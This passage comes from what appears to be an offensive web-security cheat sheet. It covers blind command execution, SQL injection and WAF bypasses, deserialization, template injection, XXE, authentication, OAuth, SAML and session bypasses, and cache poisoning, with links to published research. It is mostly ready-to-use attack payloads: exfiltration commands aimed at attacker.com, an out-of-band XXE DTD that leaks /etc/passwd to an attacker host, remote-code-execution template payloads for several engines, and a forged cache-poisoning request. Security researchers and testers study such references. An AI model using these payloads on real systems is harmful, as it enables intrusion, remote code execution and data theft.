+<li><strong>ImageMagick</strong>: <code>msl:</code>, <code>label:@file</code>, <code>ephemeral:</code>, <code>svg:</code> with <code>xlink:href</code>, delegate entries in <code>delegates.xml</code></li>
+<li><strong>Ghostscript</strong>: <code>%pipe%id</code>, <code>-sOutputFile=</code>, PostScript <code>(%pipe%)</code></li>
+<li><strong>LibreOffice</strong>: format chosen by content, not extension → OLE xlinks, ODF sections, EPS → Ghostscript (<a href="https://buer.haus/2019/10/18/a-tale-of-exploitation-in-spreadsheet-file-conversions/">buer.haus</a>)</li>
+<li><strong>LaTeX</strong>: <code>\write18</code>, <code>\input</code>, <code>\include</code>, <code>\lstinputlisting</code></li>
+<li><strong>Tika/ExifTool/Pandoc</strong>: SSRF, file read, and (older) command injection</li>
+<li><strong>PDF password</strong> into Ghostscript's <code>-authenticate</code> inside double quotes → <code>" $(id) "</code> (<a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">ImageMagick</a>)</li>
+</ul>
+<h3 id="45-blind-command-execution">4.5 Blind command execution</h3>
+<ul>
+<li>Time: <code>sleep 5</code>, <code>ping -c 5 127.0.0.1</code></li>
+<li>DNS: <code>nslookup $(whoami).attacker.com</code></li>
+<li>HTTP: <code>curl attacker.com/$(id|base64)</code></li>
+<li>Exit-code oracle: <code>test -f /x &amp;&amp; sleep 3</code></li>
+<li>Numeric-only output: encode to base-36/base-27 and chunk into a large integer. (<a href="https://blog.ikaes.de/exfiltration-using-numeric-only-outputs/">numeric-only exfil</a>)</li>
+</ul>
+<hr />
+<h2 id="5-sql-injection-beyond-the-obvious">5. SQL injection, beyond the obvious</h2>
+<h3 id="51-prepared-statements-that-are-not">5.1 Prepared statements that are not</h3>
+<ul>
+<li><strong>PDO emulation</strong> (default on): a NUL byte makes PDO's own scanner abandon a backtick identifier, so a <code>?</code> inside a column name becomes a bound parameter and a second value is substituted raw. (<a href="https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/">Searchlight</a>)</li>
+<li><strong>mysqljs/mysql</strong>: an object parameter is emitted as a backtick identifier, not a quoted string — always-true column comparison. (<a href="https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4">Flatt</a>)</li>
+<li><strong>mysql2</strong>: arrays/objects become SQL fragments by default. (<a href="https://blog.mantrainfosec.com/blog/18/prepared-statements-prepared-to-be-vulnerable">Prepared to Be Vulnerable</a>)</li>
+<li><strong>Protocol-level smuggling</strong>: a ~4 GB parameter overflows the 4-byte length field; the tail is parsed as a new message. (<a href="https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn%27t%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf">SonarSource</a>)</li>
+</ul>
+<h3 id="52-injection-points-nobody-tests">5.2 Injection points nobody tests</h3>
+<ul>
+<li><code>ORDER BY</code> column and direction, <code>LIMIT</code>/<code>OFFSET</code></li>
+<li>Full-text search: MySQL boolean-mode operators (<code>+</code>, <code>-</code>, <code>*</code>, <code>"</code>, <code>~</code>, <code>&gt;</code>, <code>&lt;</code>, <code>()</code>) form a language that escaping does not cover. (<a href="https://exploit.az/posts/wor/">ReDisclosure</a>)</li>
+<li>JSON path arguments, <code>-&gt;</code>/<code>-&gt;&gt;</code> keys, <code>jsonb_path_query</code></li>
+<li>Array keys in a query builder (Drupal's case-insensitive <code>IN</code> rebuilds placeholders outside normalization) (<a href="https://www.slcyber.io/research/keys-to-the-kingdom-anonymous-sql-injection-in-drupal-core-cve-2026-9082">CVE-2026-9082</a>)</li>
+<li><code>LIKE</code> patterns, <code>REGEXP</code>, <code>MATCH ... AGAINST</code></li>
+<li>Column/table names from a whitelist you can poison</li>
+<li>ORM filter objects (<code>filter(**request.data)</code>) → <strong>ORM leak</strong>: choose column and operator, use <code>startswith</code>/<code>gt</code> as a character oracle across relations. (<a href="https://www.elttam.com/blog/plormbing-your-django-orm/">plORMbing Django</a>, <a href="https://www.elttam.com/blog/plorming-your-primsa-orm/">Prisma</a>, <a href="https://www.elttam.com/blog/leaking-more-than-you-joined-for/">Harbor</a>)</li>
+</ul>
+<h3 id="53-waf-bypass-via-database-specific-syntax">5.3 WAF bypass via database-specific syntax</h3>
+<ul>
+<li><strong>JSON operators</strong>: appending <code>@&gt;</code> keeps the statement valid for Postgres while a non-JSON-aware parser stops recognizing it. (<a href="https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf">JS-ON: Security-OFF</a>)</li>
+<li><strong>MSSQL stacking without separators</strong>: <code>exec()</code> needs neither <code>;</code> nor whitespace. (<a href="https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/">GoSecure</a>)</li>
+<li><strong>MySQL <code>1.e</code></strong>: a malformed scientific-notation token is silently discarded, so the query stays valid while looking like garbage. (<a href="https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/">GoSecure</a>)</li>
+<li><strong>Homoglyph quotes</strong>: U+02BC folds to <code>'</code> in SQL Server best-fit. (<a href="http://www.comsecglobal.com/FrameWork/Upload/SQL_Smuggling.pdf">SQL Smuggling</a>)</li>
+<li><strong>Emoji collation</strong>: MSSQL compares a goblin emoji equal to the empty string, so a login lookup returns blank-email accounts. (<a href="https://decrypt.lol/posts/2024/11/29/mssql-identified-as-vulnerable-to-emoji-string-exploitation/">Decrypt LOL</a>)</li>
+<li><strong>Comments</strong>: <code>/*!50000 ... */</code>, <code>-- -</code>, <code>#</code>, <code>/**/</code>, <code>/*!*/</code>.</li>
+</ul>
+<h3 id="54-from-injection-to-rce">5.4 From injection to RCE</h3>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>Read</th>
+<th>Write</th>
+<th>Execute</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td><code>LOAD_FILE</code></td>
+<td><code>INTO OUTFILE</code>, <code>INTO DUMPFILE</code></td>
+<td>UDF <code>.so</code> into plugin dir</td>
+</tr>
+<tr>
+<td>Postgres</td>
+<td><code>pg_read_file</code>, <code>lo_import</code>, <code>COPY FROM</code></td>
+<td><code>lo_export</code>, <code>COPY TO</code></td>
+<td><code>COPY ... TO PROGRAM</code>, <code>CREATE FUNCTION ... LANGUAGE C</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>OPENROWSET(BULK)</code>, <code>fn_xe_file_target_read_file</code></td>
+<td><code>BACKUP ... TO DISK</code>, <code>sp_OACreate</code></td>
+<td><code>xp_cmdshell</code>, <code>sp_OACreate</code> WScript.Shell, CLR assembly</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>UTL_FILE</code>, <code>DBMS_LOB</code></td>
+<td><code>UTL_FILE</code></td>
+<td>Java source, <code>DBMS_SCHEDULER</code></td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td><code>readfile()</code></td>
+<td><code>writefile()</code>, <code>dbpage</code></td>
+<td>load_extension, <code>.so</code> shadowing</td>
+</tr>
+</tbody>
+</table>
+<p>SELECT-only Postgres is still enough: <code>lo_import</code> reads <code>pg_authid</code>'s filenode, and a filenode editor flips the superuser bit offline. (<a href="https://phrack.org/issues/71/8#article">Phrack 71</a>)</p>
+<h3 id="55-blind-oracles">5.5 Blind oracles</h3>
+<p>Boolean, error (division by zero, cast failure), time (<code>pg_sleep</code>, <code>WAITFOR DELAY</code>, <code>SLEEP</code>), DNS (<code>fn_xe_file_target_read_file</code> to a UNC path), and <strong>sort</strong> (make the target a hidden participant in an <code>ORDER BY</code>). (<a href="https://bugcrowd.com/disclosures/0ecb51a3-2064-4f9d-aa19-aa7b6ae21812">Trello sort oracle</a>)</p>
+<hr />
+<h2 id="6-deserialization-and-object-injection">6. Deserialization and object injection</h2>
+<h3 id="61-language-cheat-sheet">6.1 Language cheat sheet</h3>
+<table>
+<thead>
+<tr>
+<th>Language</th>
+<th>Format</th>
+<th>Marker</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PHP</td>
+<td><code>serialize()</code></td>
+<td><code>O:8:"stdClass":...</code></td>
+</tr>
+<tr>
+<td>Java</td>
+<td><code>ObjectOutputStream</code></td>
+<td><code>AC ED 00 05</code>, base64 <code>rO0AB</code></td>
+</tr>
+<tr>
+<td>.NET</td>
+<td><code>BinaryFormatter</code></td>
+<td><code>AAEAAAD/////</code></td>
+</tr>
+<tr>
+<td>Python</td>
+<td>pickle</td>
+<td><code>\x80\x04</code>, <code>cos\nsystem\n</code></td>
+</tr>
+<tr>
+<td>Ruby</td>
+<td>Marshal</td>
+<td><code>\x04\x08</code></td>
+</tr>
+<tr>
+<td>Node</td>
+<td><code>node-serialize</code></td>
+<td><code>{"rce":"_$$ND_FUNC$$_function(){...}()"}</code></td>
+</tr>
+<tr>
+<td>YAML</td>
+<td><code>!!python/object</code>, <code>!!ruby/object</code></td>
+<td>tag</td>
+</tr>
+<tr>
+<td>MessagePack</td>
+<td>typeless mode</td>
+<td>type tags</td>
+</tr>
+</tbody>
+</table>
+<h3 id="62-where-it-hides">6.2 Where it hides</h3>
+<p>Cookies and session blobs, hidden form fields, <code>ViewState</code>, <code>__VIEWSTATE</code>/<code>__EVENTVALIDATION</code>, cache entries, message queues, RMI/JMX, .NET Remoting, <code>phar://</code> (metadata is deserialized on <em>any</em> filesystem call), signed cookies, OAuth state, SAML, JWT claims, Redis session values, and "import project/config" features.</p>
+<h3 id="63-php-specifics">6.3 PHP specifics</h3>
+<ul>
+<li><strong>POP chains</strong>: build a property graph from <code>__destruct</code>/<code>__wakeup</code>/<code>__toString</code>/<code>__call</code> to a sink. <code>phpggc</code> has most frameworks.</li>
+<li><strong>Phar</strong>: <code>phar://</code> triggers metadata deserialization even for <code>file_exists()</code>.</li>
+<li><strong>Escaped S-format</strong>: <code>s:5:"\00..."</code> — printable escapes survive filters and reconstruct private-property NULs. (<a href="https://nullcathedral.com/posts/2026-03-16-perfex-crm-unauthenticated-rce-insecure-deserialization/">Perfex</a>)</li>
+<li><strong>Cross-plugin autoloading</strong>: a gadget class from an unrelated installed plugin becomes reachable. (<a href="https://blog.sicuranext.com/exploiting-a-php-object-injection-in-profile-builder-pro-in-the-era-of-ai/">Profile Builder</a>)</li>
+</ul>
+<h3 id="64-java-specifics">6.4 Java specifics</h3>
+<p><code>ysoserial</code> chains (CommonsCollections, CommonsBeanutils, Spring, Groovy, Hibernate, JDK-only), JNDI (<code>ldap://</code>/<code>rmi://</code> → remote <code>Reference</code> → <code>factory</code> class), <code>URLDNS</code> for detection, JRMP listener for egress-free exploitation, and <code>ViewState</code> without <code>machineKey</code> (<code>.NET</code> sibling).</p>
+<p>Gadget discovery is now graph work: a call graph pruned to <code>Serializable</code> classes, extended with reflection and type-confusion edges, validated by a harness. (<a href="https://www.atredis.com/blog/2026/3/12/findings-gadgets-like-its-2026">Finding Gadgets Like it's 2026</a>)</p>
+<h3 id="65-net-specifics">6.5 .NET specifics</h3>
+<p><code>BinaryFormatter</code>, <code>LosFormatter</code>, <code>ObjectStateFormatter</code>, <code>TypeConverter</code>/<code>ExpandableObjectConverter</code>, <code>ResourceSet</code>/<code>ResXFileRef</code> (opens a UNC path), <code>ImageSourceConverter</code> (fetches a URL), <code>XamlReader</code>, <code>ObjectDataProvider</code>, <code>ActivitySurrogateSelector</code>. Conversion layers are sinks even without a serializer: any input-driven type resolution that <em>constructs</em> a type is exploitable. (<a href="https://i.blackhat.com/BH-USA-26/Presentations/BHUS26-Mirosh-Transformers-Dark-Side-WP.pdf">Transformers: Dark Side of the Type</a>)</p>
+<h3 id="66-python-ruby">6.6 Python / Ruby</h3>
+<ul>
+<li>Pickle: <code>__reduce__</code> returning <code>(os.system, ("id",))</code>. Restricted unpicklers (<code>find_class</code> allowlists) are bypassable via <code>builtins.eval</code>, <code>getattr</code>, and importable module chains.</li>
+<li>Ruby: universal <code>Marshal.load</code> chain through <code>Gem::Requirement</code> → <code>Gem::Package::TarReader</code> → <code>Net::BufferedIO</code> → <code>Net::WriteAdapter</code>. (<a href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html">devcraft</a>)</li>
+<li>Ruby 4.0 has a fresh universal chain via <code>Gem::SpecFetcher</code> autoload and <code>Time._load</code>. (<a href="https://www.elttam.com/blog/ruby-4-0-universal-rce-deserialization-gadget-chain">elttam</a>)</li>
+</ul>
+<h3 id="67-prototype-class-pollution">6.7 Prototype / class pollution</h3>
+<p>Server-side prototype pollution is object injection's quiet cousin: no serializer, just a recursive merge.</p>
+<ul>
+<li>Node: <code>__proto__</code>, <code>constructor.prototype</code>. Detect without DoS by polluting properties with visible-but-safe effects (JSON spacing, CORS exposed headers, status code, <code>OPTIONS</code> output, <code>NODE_OPTIONS</code> for OOB). (<a href="https://portswigger.net/research/server-side-prototype-pollution">PortSwigger</a>)</li>
+<li>Gadgets turn pollution into SSRF, file write, or RCE. (<a href="https://www.usenix.org/conference/usenixsecurity24/presentation/cornelissen">GHunter</a>, <a href="https://arxiv.org/abs/2207.11171">Silent Spring</a>)</li>
+<li>Python: <code>__class__</code>, <code>__base__</code>, <code>__globals__</code>, <code>__kwdefaults__</code> — one nested merge rewrites module globals. (<a href="https://blog.abdulrah33m.com/prototype-pollution-in-python/">Python class pollution</a>, <a href="https://media.defcon.org/DEF%20CON%2034/DEF%20CON%2034%20presentations/DEF%20CON%2034%20-%20Gavin%20Zhong%2C%20Zhengyu%20Liu%2C%20Jianjia%20Yu%20-%20Get%20Set%2C%20Exploit%20Unveiling%20Python%20Class%20Pollution%20In-the-Wild%20-%20P.pdf">DEF CON 34</a>)</li>
+<li>Ruby: <code>instance_variable_set</code> walk, then shadow <code>to_s</code> to pass an auth check or set <code>protected_methods</code> to reach <code>instance_eval</code>. (<a href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">Doyensec</a>)</li>
+</ul>
+<hr />
+<h2 id="7-template-and-expression-injection">7. Template and expression injection</h2>
+<h3 id="71-detection-polyglots">7.1 Detection polyglots</h3>
+<pre><code>${7*7}   {{7*7}}   &lt;%= 7*7 %&gt;   #{7*7}   {7*7}   @(7*7)   *{7*7}   ${{7*7}}
+</code></pre>
+<p>Send all at once in one parameter; a single <code>49</code> identifies the engine family. Then fingerprint precisely: <code>${7*'7'}</code> (49 vs 7777777), <code>{{7*'7'}}</code>, <code>{{config}}</code>, <code>#{7*7}</code>.</p>
+<h3 id="72-engines-and-escapes">7.2 Engines and escapes</h3>
+<p>Jinja2, Twig, Smarty, Mako, Blade, FreeMarker, Velocity, Thymeleaf (SpEL), Groovy, Razor, Jelly, OGNL (Struts), EL (Spring), Handlebars, EJS, Pug, Nunjucks, Pebble.</p>
+<ul>
+<li><strong>Jinja2</strong>: <code>{{ ''.__class__.__mro__[1].__subclasses__() }}</code> → <code>subprocess.Popen</code>. <code>{{ cycler.__init__.__globals__.os.popen('id').read() }}</code>. <code>{{ lipsum.__globals__["os"].popen("id").read() }}</code>.</li>
+<li><strong>Twig</strong>: <code>{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}</code>, <code>{{ ['id']|filter('system') }}</code>.</li>
+<li><strong>FreeMarker</strong>: <code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")}</code>.</li>
+<li><strong>SpEL</strong>: <code>T(java.lang.Runtime).getRuntime().exec("id")</code>, <code>new java.lang.ProcessBuilder(...)</code>.</li>
+<li><strong>OGNL</strong>: <code>%{@java.lang.Runtime@getRuntime().exec('id')}</code>.</li>
+<li><strong>Razor</strong>: <code>@{ System.Diagnostics.Process.Start("id"); }</code>.</li>
+<li><strong>Blade</strong>: <code>{{ system('id') }}</code>, <code>@php system('id') @endphp</code>.</li>
+</ul>
+<h3 id="73-when-quotes-and-spaces-are-filtered">7.3 When quotes and spaces are filtered</h3>
+<p>Build strings from runtime values instead of literals: <code>request['x']</code>, <code>self</code>, config values, <code>dict</code> keys, slicing (<code>'abc'[0]</code>), <code>chr()</code>, <code>%c</code> formatting. Alex Brumen's quote-free payloads for eight engines are the reference. (<a href="https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation">Limitations are just an illusion</a>)</p>
+<h3 id="74-blind-ssti">7.4 Blind SSTI</h3>
+<ul>
+<li><strong>Error-based</strong>: force the engine to render the <em>result</em> inside an exception message, so a swallowed output still leaks. (<a href="https://github.com/vladko312/Research_Successful_Errors">Successful Errors</a>)</li>
+<li><strong>Boolean error-based</strong>: raise an error conditionally on a predicate → one bit per request.</li>
+<li><strong>Time</strong>: <code>sleep</code> in the payload.</li>
+<li><strong>OOB</strong>: <code>curl</code>/DNS from the payload.</li>
+</ul>
+<h3 id="75-templates-outside-the-web-page">7.5 Templates outside the web page</h3>
+<ul>
+<li><strong>Helm</strong> values rendered by ArgoCD: multiline values, quoting, <code>---</code> to add resources. (<a href="https://www.synacktiv.com/en/publications/charting-your-way-in-helm-template-injection">Synacktiv</a>)</li>
+<li><strong>Jupyter Enterprise Gateway</strong>: explicit Jinja evaluation of kernel args. (<a href="https://www.elttam.com/blog/jupyter-enterprise-gateway">elttam</a>)</li>
+<li><strong>ServiceNow Jelly</strong>: rendered twice, and any query parameter binds to a template variable. (<a href="https://www.assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data">Assetnote</a>)</li>
+<li><strong>Craft CMS</strong>: <code>register_argc_argv</code> fills <code>$_SERVER['argv']</code> from the query string, so <code>?--templatesPath=</code> sets the template root. (<a href="https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms">Assetnote</a>)</li>
+<li><strong>Email templates, notification templates, invoice templates, CI pipeline templates</strong> — all the same sink with worse sandboxes.</li>
+</ul>
+<hr />
+<h2 id="8-xxe-and-xml">8. XXE and XML</h2>
+<h3 id="81-basics">8.1 Basics</h3>
+<pre><code class="language-xml">&lt;!-- in-band --&gt;
+&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;
+
+&lt;!-- OOB, no output --&gt;
+&lt;!DOCTYPE r [&lt;!ENTITY % p SYSTEM &quot;http://attacker/dtd&quot;&gt;&lt;!ENTITY % e &quot;%p;&quot;&gt;%e;]&gt;
+</code></pre>
+<p><code>attacker/dtd</code>:</p>
+<pre><code>&lt;!ENTITY % f SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % d &quot;&lt;!ENTITY &amp;#37; exfil SYSTEM 'http://attacker/?%f;'&gt;&quot;&gt;
+%d;%exfil;
+</code></pre>
+<h3 id="82-impossible-xxe">8.2 "Impossible" XXE</h3>
+<ul>
+<li><code>LIBXML_NOENT</code> off but DTD processing on: parameter entities still expand during parsing.</li>
+<li>Network disabled: use a <strong>local DTD</strong> (<code>/usr/share/xml/...</code>) and redefine an entity it declares. (<a href="https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html">DTD Finder</a>)</li>
+<li><code>DOCTYPE</code> rejected after parsing: put the system identifier on the DOCTYPE itself, or use <code>php://filter</code> chains. (<a href="https://swarm.ptsecurity.com/impossible-xxe-in-php/">Impossible XXE in PHP</a>)</li>
+<li>Errors swallowed: OOB only, or <code>netdoc:</code>/<code>file:</code> to a UNC path — multi-line contents go out over SMB. (<a href="https://mp.weixin.qq.com/s/kUlXxJxKO-70QMNCQvLHZA">Make XXE Brilliant Again</a>)</li>
+</ul>
+<h3 id="83-xxe-credentials">8.3 XXE → credentials</h3>
+<p><code>\\attacker\share</code> makes the parser authenticate over SMB → NTLMv2 hash → relay or crack. (<a href="https://techblog.mediaservice.net/2018/02/from-xml-external-entity-to-ntlm-domain-hashes/">XXE to NTLM</a>) With <code>responder</code> + <code>ntlmrelayx</code> this becomes domain access without any file read.</p>
+<h3 id="84-xml-signature-and-parser-attacks">8.4 XML signature and parser attacks</h3>
+<ul>
+<li><strong>XSW (XML Signature Wrapping)</strong>: move the signed assertion and add a forged one; the verifier checks the signature on one node and the app reads another.</li>
+<li><strong>Unanchored XPath</strong>: <code>//DigestValue</code> picks up a value smuggled elsewhere. (<a href="https://projectdiscovery.io/blog/ruby-saml-gitlab-auth-bypass">CVE-2024-45409</a>)</li>
+<li><strong>Parser differential</strong>: REXML vs Nokogiri vs libxml2 disagree on namespace and entity handling. (<a href="https://portswigger.net/research/the-fragile-lock">The Fragile Lock</a>)</li>
+<li><strong>Round-trip mutation</strong>: <code>&amp;#x2e;</code>, CDATA, attribute reordering change the document between verify and use.</li>
+<li><strong>XSLT</strong>: <code>&lt;xsl:document()&gt;</code> fetches, <code>xsl:include</code> loads, <code>node-set</code> extensions escape. Pre-auth, because transforms run before trust is established. (<a href="https://www.youtube.com/watch?v=WHn-6xHL7mI">Hacking the Cloud with SAML</a>)</li>
+<li><strong>XInclude</strong>: <code>&lt;xi:include href="file:///etc/passwd" parse="text"/&gt;</code> where DOCTYPE is blocked.</li>
+</ul>
+<hr />
+<h2 id="9-authentication-and-session-bypass">9. Authentication and session bypass</h2>
+<h3 id="91-routing-bypass">9.1 Routing bypass</h3>
+<p>Vol. 1 §4 in full. Plus:</p>
+<ul>
+<li><strong>Trailing-slash / extension</strong>: <code>/admin</code> protected, <code>/admin/</code> or <code>/admin.json</code> not.</li>
+<li><strong>Case</strong>: <code>/Admin</code>, <code>/ADMIN</code>.</li>
+<li><strong><code>..;/</code>, <code>%2e</code>, <code>%2f</code>, <code>;</code></strong> — proxy sees a different path than the backend.</li>
+<li><strong>Encoded <code>?</code></strong> truncating an ACL match (<code>admin.php%3Ffoo</code>).</li>
+<li><strong><code>X-Original-URL</code> / <code>X-Rewrite-URL</code></strong> when the front end rewrites but the backend trusts the header.</li>
+<li><strong>Internal headers</strong>: <code>x-middleware-subrequest</code> (Next.js), <code>X-Forwarded-For: 127.0.0.1</code> for IP allowlists, <code>X-Forwarded-Host</code> for vhost ACLs.</li>
+<li><strong>Method</strong>: <code>POST</code> vs <code>GET</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>TRACE</code>, <code>PUT</code>, <code>PATCH</code>, <code>PROPFIND</code>. <code>HEAD</code> often skips body-based auth.</li>
+<li><strong>Method override</strong>: <code>_method=POST</code>, <code>X-HTTP-Method-Override</code>.</li>
+<li><strong>Static handler fallthrough</strong>: <code>/admin/index.html</code> served by the static server without auth.</li>
+<li><strong>Continued execution after redirect</strong>: the framework sets a 302 to login but keeps processing, so the response body still contains the protected data. (<a href="https://labs.watchtowr.com/youre-not-supposed-to-sharefile-with-everyone-progress-sharefile-pre-auth-rce-chain-cve-2026-2699-cve-2026-2701/">ShareFile</a>)</li>
+<li><strong><code>Referer</code> checks</strong>: a <code>Referer</code> pointing at the SignOut page skipped the anonymous check in SharePoint. (<a href="https://blog.viettelcybersecurity.com/sharepoint-toolshell/">ToolShell</a>)</li>
+<li><strong>Path-prefix wildcards</strong>: TeamCity excluded <code>/**/RPC2</code> from all interceptors, where the auth check lived. (<a href="https://www.sonarsource.com/blog/teamcity-vulnerability/">Sonar</a>)</li>
+</ul>
+<h3 id="92-token-attacks">9.2 Token attacks</h3>
+<ul>
+<li><strong>JWT <code>alg: none</code></strong>, <code>alg</code> confusion (RS256 → HS256 with the public key as secret), <code>jku</code>/<code>x5u</code> to your host, <code>kid</code> path traversal or SQLi, embedded <code>jwk</code> trusted from the header.</li>
+<li><strong>PBES2 with a huge iteration count</strong> burns CPU before the tag is checked. (<a href="https://i.blackhat.com/BH-US-23/Presentations/US-23-Tervoort-Three-New-Attacks-Against-JSON-Web-Tokens-whitepaper.pdf">Three New Attacks Against JWT</a>)</li>
+<li><strong>JSON-serialized JWS</strong> smuggles unsigned claims past a dot-splitting validator.</li>
+<li><strong>Token encrypted to the public half of a signing key</strong> is accepted as authentic.</li>
+<li><strong>Psychic signatures</strong>: all-zero ECDSA <code>r</code>,<code>s</code> verifies on Java 15–18. (<a href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/">Neil Madden</a>)</li>
+<li><strong>Signed-cookie formats</strong> beyond JWT (Django, Flask, Express, Rails) with default or leaked secrets — <code>SignSaboteur</code> automates. (<a href="https://portswigger.net/research/introducing-signsaboteur-forge-signed-web-tokens-with-ease">PortSwigger</a>)</li>
+<li><strong>Predictable tokens</strong>: <code>uniqid()</code>, <code>time()</code>, UUIDv1, MongoDB ObjectID — the <code>Date</code> header gives the instant; hash it and compare. (<a href="https://www.aeth.cc/public/Article-Reset-Tolkien/secret-time-based-article-en.html">Reset Tolkien</a>)</li>
+<li><strong><code>Math.random()</code> state recovery</strong> from observed outputs (V8, PHP MT, Python <code>random</code>). (<a href="https://horizon3.ai/attack-research/disclosures/anthropic-mythos-rejetto-hfs-rce/">Rejetto HFS</a>)</li>
+</ul>
+<h3 id="93-oauth-oidc">9.3 OAuth / OIDC</h3>
+<ul>
+<li><code>redirect_uri</code> path confusion: <code>/callback</code> registered, <code>/callback/../evil</code>, <code>/callback%2f..%2f</code>, <code>/callback?x=</code>, <code>/callback#</code>. Also <code>@</code>, <code>\</code>, and a second <code>?</code>.</li>
+<li><code>localhost</code> allowlist → run a local server from a malicious app. (<a href="https://osec.io/blog/2025-10-16-how-we-broke-exchanges-oauth-misconfigurations">OtterSec</a>)</li>
+<li><strong>Device code flow hijack</strong>: <code>client_id</code>/<code>scope</code> not bound to the <code>device_code</code>; swap in a pre-approved client and poll. (<a href="https://weirdmachine64.github.io/research/google-oauth-device-code-hijacking.html">Confused Deputy</a>)</li>
+<li><strong>Authorization code injection</strong>: start a flow in a hidden frame, break it so the app never consumes the code, replay the response from your machine. (<a href="https://medium.com/@anador/attacks-via-a-new-oauth-flow-authorization-code-injection-and-whether-httponly-pkce-and-bff-3db1624b4fa7">code injection</a>)</li>
+<li><strong><code>prompt=none</code></strong> in a popup mints a fresh token silently from an existing session — turns any XSS into ATO. (<a href="https://security.lauritz-holtmann.de/post/xss-ato-gadgets/">SSO Gadgets</a>)</li>
+<li><strong><code>response_type</code> switch</strong> (<code>code</code> → <code>id_token</code>) derails the callback into an error branch that redirects to the <code>Referer</code> with the fragment intact. (<a href="https://blog.voorivex.team/oauth-non-happy-path-to-ato">OAuth Non-Happy Path</a>)</li>
+<li><strong><code>email</code> claim instead of <code>sub</code></strong> for identity → unverified-email takeover (nOAuth). (<a href="https://www.descope.com/blog/post/noauth">Descope</a>)</li>
+<li><strong>Dynamic client registration</strong> with <code>logo_uri</code>/<code>jwks_uri</code>/<code>request_uris</code> → second-order SSRF. (<a href="https://portswigger.net/research/hidden-oauth-attack-vectors">Hidden OAuth attack vectors</a>)</li>
+<li><strong><code>state</code> not bound</strong>, missing PKCE, implicit flow, permissive CORS on the token endpoint.</li>
+</ul>
+<h3 id="94-saml">9.4 SAML</h3>
+<p>Signature wrapping, <code>KeyInfo</code> self-signed cert trusted, missing <code>Signature</code> element, duplicate ID, comment injection in the NameID, <code>DigestValue</code> from another node, namespace confusion, and parser differentials. (<a href="https://portswigger.net/research/saml-roulette-the-hacker-always-wins">SAML roulette</a>, <a href="https://speakerdeck.com/greendog/how-to-break-saml-if-i-have-paws">How to break SAML</a>)</p>
+<h3 id="95-session-mechanics">9.5 Session mechanics</h3>
+<ul>
+<li><strong>Cookie tossing</strong>: control of a subdomain lets you set a cookie for the parent with a narrow <code>Path</code>, so it wins on the target endpoint — session fixation on OAuth callbacks. (<a href="https://snyk.io/articles/hijacking-oauth-flows-via-cookie-tossing/">Snyk</a>)</li>
+<li><strong>Cookie sandwich</strong>: an attacker cookie with a leading quote surrounds an HttpOnly cookie so the server reflects the combined value into script-readable output. (<a href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique">PortSwigger</a>)</li>
+<li><strong>Cookie bomb</strong>: oversized cookies force a 431/400 and drop the session, or break a one-time token so it is not consumed.</li>
+<li><strong>Session fixation via pre-auth token</strong>: set the session id, then have the victim log in.</li>
+<li><strong>Cross-site WebSocket hijacking</strong>: no <code>Origin</code> check on the handshake + <code>SameSite=None</code> cookies. (<a href="https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/">Include Security</a>)</li>
+<li><strong>Pre-hijacked accounts</strong>: register with the victim's email before they do, then keep access after they sign up. (<a href="https://arxiv.org/abs/2205.10174">arXiv</a>)</li>
+</ul>
+<h3 id="96-passkeys-webauthn">9.6 Passkeys / WebAuthn</h3>
+<p>Flow confusion between discoverable and non-discoverable credentials, substituting the <code>allowCredentials</code> id, <code>userVerification</code> downgrade, origin/RP-ID mismatch on subdomains, and recovery-path takeover. (<a href="https://www.securing.pl/en/cve-2025-26788-passkey-authentication-bypass-in-strongkey-fido-server/">StrongKey bypass</a>, <a href="https://media.defcon.org/DEF%20CON%2034/DEF%20CON%2034%20presentations/DEF%20CON%2034%20-%20Matteo%20Giordano%20-%20Beyond%20the%20Ceremony%20The%202026%20Passkey%20Attack%20Surface%20-%20v2.pdf">Beyond the Ceremony</a>)</p>
+<hr />
+<h2 id="10-cache-attacks">10. Cache attacks</h2>
+<h3 id="101-poisoning">10.1 Poisoning</h3>
+<p>Find an input the cache excludes from its key but the origin reflects. Classic unkeyed: <code>X-Forwarded-Host</code>, <code>X-Forwarded-Scheme</code>, <code>X-Host</code>, <code>X-Original-URL</code>, <code>X-Rewrite-URL</code>, <code>Forwarded</code>, <code>X-Forwarded-Port</code>, <code>Accept-Encoding</code> variants.</p>
+<pre><code>GET / HTTP/1.1
+Host: expected.com
+X-Forwarded-Host: attacker.com
+</code></pre>
